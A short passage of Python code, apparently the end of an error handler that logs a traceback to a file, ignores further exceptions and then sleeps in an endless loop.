                f.write(traceback.format_exc())
        except Exception:
            pass
        while True:
            time.sleep(60)
